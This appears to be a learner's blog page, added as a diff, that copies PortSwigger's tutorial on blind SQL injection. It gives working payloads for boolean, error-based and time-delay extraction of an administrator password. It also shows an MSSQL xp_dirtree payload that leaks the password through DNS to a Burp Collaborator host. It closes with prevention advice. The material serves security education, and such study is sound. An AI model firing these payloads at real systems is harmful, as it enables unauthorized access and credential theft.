@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MirRoR4s">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="tags: PortSwiggerBlind SQL injectionIn this section, we’ll describe what blind SQL injection is, explain various techniques for finding and exploiting blind SQL injection vulnerabilities. 前言 文章地址  Wha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Port-Swigger-Blind-SQL-injection">
+<meta property="og:url" content="https://mirror4s.github.io/2023/03/31/PortSwigger-SQL-injection-cheat-sheet/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="tags: PortSwiggerBlind SQL injectionIn this section, we’ll describe what blind SQL injection is, explain various techniques for finding and exploiting blind SQL injection vulnerabilities. 前言 文章地址  Wha">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-30T23:17:23.000Z">
+<meta property="article:modified_time" content="2023-04-01T03:01:14.769Z">
+<meta property="article:author" content="MirRoR4s">
+<meta property="article:tag" content="PortSwigger">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Port-Swigger-Blind-SQL-injection - 学习记录</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mirror4s.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Port-Swigger-Blind-SQL-injection"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-31 07:17" pubdate>
+          2023年3月31日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          87 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Port-Swigger-Blind-SQL-injection</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年4月1日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h6 id="tags-portswigger"><a href="#tags-PortSwigger" class="headerlink" title="tags: PortSwigger"></a>tags: <code>PortSwigger</code></h6><h1 id="blind-sql-injection"><a href="#Blind-SQL-injection" class="headerlink" title="Blind SQL injection"></a>Blind SQL injection</h1><p>In this section, we’ll describe what blind SQL injection is, explain various techniques for finding and exploiting blind SQL injection vulnerabilities.</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind">文章地址</a></li>
+</ul>
+<h2 id="what-is-blind-sql-injection"><a href="#What-is-blind-SQL-injection" class="headerlink" title="What is blind SQL injection?"></a>What is blind SQL injection?</h2><p>Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p>
+<p>With blind SQL injection vulnerabilities, many techniques such as <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks"><code>UNION</code> attacks</a>, are not effective because they rely on being able to see the results of the injected query within the application’s responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.</p>
+<h2 id="exploiting-blind-sql-injection-by-triggering-conditional-responses"><a href="#Exploiting-blind-SQL-injection-by-triggering-conditional-responses" class="headerlink" title="Exploiting blind SQL injection by triggering conditional responses"></a>Exploiting blind SQL injection by triggering conditional responses</h2><p>Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">TrackingId</span>=u5YD3PapBcR4lN3e7Tj4<br></code></pre></td></tr></table></figure>
+
+<p>When a request containing a <code>TrackingId</code> cookie is processed, the application determines whether this is a known user using a SQL query like this:</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> TrackingId <span class="hljs-keyword">FROM</span> TrackedUsers <span class="hljs-keyword">WHERE</span> TrackingId = <span class="hljs-string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized <code>TrackingId</code> was submitted), then a “Welcome back” message is displayed within the page.</p>
+<p>This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p>The first of these values will cause the query to return results, because the injected <code>AND &#39;1&#39;=&#39;1</code> condition is true, and so the “Welcome back” message will be displayed. Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the “Welcome back” message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.</p>
+<p>For example, suppose there is a table called <code>Users</code> with the columns <code>Username</code> and <code>Password</code>, and a user called <code>Administrator</code>. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.</p>
+<p>To do this, we start with the following input:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">xyz<span class="hljs-string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="hljs-string">r&#x27;), 1, 1) &gt; &#x27;</span>m<br></code></pre></td></tr></table></figure>
+
+<p>This returns the “Welcome back” message, indicating that the injected condition is true, and so the first character of the password is greater than <code>m</code>.</p>
+<p>Next, we send the following input:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">xyz<span class="hljs-string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="hljs-string">r&#x27;), 1, 1) &gt; &#x27;</span>t<br></code></pre></td></tr></table></figure>
+
+<p>This does not return the “Welcome back” message, indicating that the injected condition is false, and so the first character of the password is not greater than <code>t</code>.</p>
+<p>Eventually, we send the following input, which returns the “Welcome back” message, thereby confirming that the first character of the password is <code>s</code>:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">xyz<span class="hljs-string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="hljs-string">r&#x27;), 1, 1) = &#x27;</span>s<br></code></pre></td></tr></table></figure>
+
+<p>We can continue this process to systematically determine the full password for the <code>Administrator</code> user.</p>
+<h4 id="note"><a href="#Note" class="headerlink" title="Note"></a>Note</h4><p>The <code>SUBSTRING</code> function is called <code>SUBSTR</code> on some types of database. For more details, see the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p><strong>PRACTITIONER</strong></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Blind SQL injection with conditional responses</a></p>
+<h2 id="inducing-conditional-responses-by-triggering-sql-errors"><a href="#Inducing-conditional-responses-by-triggering-SQL-errors" class="headerlink" title="Inducing conditional responses by triggering SQL errors"></a>Inducing conditional responses by triggering SQL errors</h2><p>In the preceding example, suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data. The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application’s responses.</p>
+<p>In this situation, it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application’s response (such as an error message), allowing us to infer the truth of the injected condition.</p>
+<p>To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">xyz&#x27; <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1</span>=<span class="hljs-number">2</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">END</span>)=<span class="hljs-symbol">&#x27;a</span> <br>xyz&#x27; <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">END</span>)=<span class="hljs-symbol">&#x27;a</span><br></code></pre></td></tr></table></figure>
+
+<p>These inputs use the <code>CASE</code> keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the <code>CASE</code> expression evaluates to <code>&#39;a&#39;</code>, which does not cause any error. With the second input, it evaluates to <code>1/0</code>, which causes a divide-by-zero error. Assuming the error causes some difference in the application’s HTTP response, we can use this difference to infer whether the injected condition is true.</p>
+<p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (Username = &#x27;</span>Administrato<span class="hljs-string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="hljs-string">&#x27;) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END FROM Users)=&#x27;</span>a<br></code></pre></td></tr></table></figure>
+
+<h4 id="note"><a href="#Note-1" class="headerlink" title="Note"></a>Note</h4><p>There are various ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p><strong>PRACTITIONER</strong></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Blind SQL injection with conditional errors</a></p>
+<h2 id="exploiting-blind-sql-injection-by-triggering-time-delays"><a href="#Exploiting-blind-SQL-injection-by-triggering-time-delays" class="headerlink" title="Exploiting blind SQL injection by triggering time delays"></a>Exploiting blind SQL injection by triggering time delays</h2><p>In the preceding example, suppose that the application now catches database errors and handles them gracefully. Triggering a database error when the injected SQL query is executed no longer causes any difference in the application’s response, so the preceding technique of inducing conditional errors will not work.</p>
+<p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.</p>
+<p>The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span>0:0:10<span class="hljs-string">&#x27;-- &#x27;</span>; <span class="hljs-keyword">IF</span> (<span class="hljs-attribute">1</span>=1) WAITFOR DELAY <span class="hljs-string">&#x27;0:0:10&#x27;</span>--<br></code></pre></td></tr></table></figure>
+
+<p>The first of these inputs will not trigger a delay, because the condition <code>1=2</code> is false. The second input will trigger a delay of 10 seconds, because the condition <code>1=1</code> is true.</p>
+<p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrato<span class="hljs-string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="hljs-string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:&#123;delay&#125;<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="note"><a href="#Note-2" class="headerlink" title="Note"></a>Note</h4><p>There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database. For more details, see the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p><strong>PRACTITIONER</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Blind SQL injection with time delays</a></p>
+<p><strong>LAB</strong></p>
+<p><strong>PRACTITIONER</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">Blind SQL injection with time delays and information retrieval</a></p>
+<h2 id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques"><a href="#Exploiting-blind-SQL-injection-using-out-of-band-OAST-techniques" class="headerlink" title="Exploiting blind SQL injection using out-of-band (OAST) techniques"></a>Exploiting blind SQL injection using out-of-band (<a target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>) techniques</h2><p>Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user’s request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application’s response doesn’t depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.</p>
+<p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.</p>
+<p>A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.</p>
+<p>The easiest and most reliable way to use out-of-band techniques is using <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>. This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to <a target="_blank" rel="noopener" href="https://portswigger.net/burp/pro">Burp Suite Professional</a> with no configuration required.</p>
+<p>The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;; exec master..xp_dirtree &#x27;</span><span class="hljs-regexp">//</span><span class="hljs-number">0</span>efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>
+
+<p>This will cause the database to perform a lookup for the following domain:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">0</span>efdymgw<span class="hljs-number">1</span><span class="hljs-meta">o5</span>w<span class="hljs-number">9</span>i<span class="hljs-symbol">nae8</span>m<span class="hljs-name">g4</span>dfrgi<span class="hljs-name">m9</span>ay.burpcollaborator.<span class="hljs-symbol">net</span><br></code></pre></td></tr></table></figure>
+
+<p>You can use <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.</p>
+<p><strong>LAB</strong></p>
+<p><strong>PRACTITIONER</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">Blind SQL injection with out-of-band interaction</a></p>
+<p>Not solved</p>
+<p>Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#x27;</span>Administrato<span class="hljs-string">r&#x27;);exec(&#x27;</span>master..xp_dirtree <span class="hljs-string">&quot;//&#x27;+@p+&#x27;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;</span><span class="hljs-string">&#x27;)--</span><br></code></pre></td></tr></table></figure>
+
+<p>This input reads the password for the <code>Administrator</code> user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">S<span class="hljs-number">3</span>cure.cwcsgt<span class="hljs-number">05</span>ikji<span class="hljs-number">0</span><span class="hljs-symbol">n1</span>f<span class="hljs-number">2</span>qlz<span class="hljs-symbol">n5118</span>sek<span class="hljs-number">29.</span>burpcollaborator.<span class="hljs-symbol">net</span><br></code></pre></td></tr></table></figure>
+
+<p>Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.</p>
+<h4 id="note"><a href="#Note-3" class="headerlink" title="Note"></a>Note</h4><p>There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p><strong>PRACTITIONER</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</a></p>
+<p>Not solved</p>
+<h2 id="how-to-prevent-blind-sql-injection-attacks"><a href="#How-to-prevent-blind-SQL-injection-attacks" class="headerlink" title="How to prevent blind SQL injection attacks?"></a>How to prevent blind SQL injection attacks?</h2><p>Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.</p>
+<p>As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PortSwigger/">#PortSwigger</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Port-Swigger-Blind-SQL-injection</div>
+      <div>https://mirror4s.github.io/2023/03/31/PortSwigger-SQL-injection-cheat-sheet/index.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MirRoR4s</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/31/Port-Swigger-Blind-SQL-injection/index.html" title="Port-Swigger-Blind-SQL-injection">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Port-Swigger-Blind-SQL-injection</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/30/Port-Swigger-Examining-the-database/index.html" title="Port-Swigger-Examining-the-database">
+                        <span class="hidden-mobile">Port-Swigger-Examining-the-database</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
